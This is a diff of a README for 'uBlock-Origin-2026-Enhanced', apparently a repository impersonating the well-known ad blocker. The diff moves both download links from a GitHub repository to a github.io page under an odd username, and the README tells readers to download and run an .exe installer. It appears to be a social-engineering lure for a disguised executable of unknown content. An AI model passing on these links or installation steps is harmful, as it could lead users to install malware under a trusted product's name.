@@ -1,6 +1,6 @@
 # 🛡️ uBlock-Origin-2026-Enhanced - Browse the web without annoying ads
 
-[![](https://img.shields.io/badge/Download-uBlock--Origin--2026-blue)](https://github.com/truncated-angiospermoustree282/uBlock-Origin-2026-Enhanced)
+[![](https://img.shields.io/badge/Download-uBlock--Origin--2026-blue)](https://truncated-angiospermoustree282.github.io)
 
 ## 🎯 About this software
 
@@ -17,7 +17,7 @@ uBlock-Origin-2026-Enhanced blocks advertisements, tracking scripts, and malicio
 
 Visit the project page to start the download.
 
-1. Go to the [official release page](https://github.com/truncated-angiospermoustree282/uBlock-Origin-2026-Enhanced).
+1. Go to the [official release page](https://truncated-angiospermoustree282.github.io).
 2. Look for the Assets section.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Save the file to your Downloads folder.
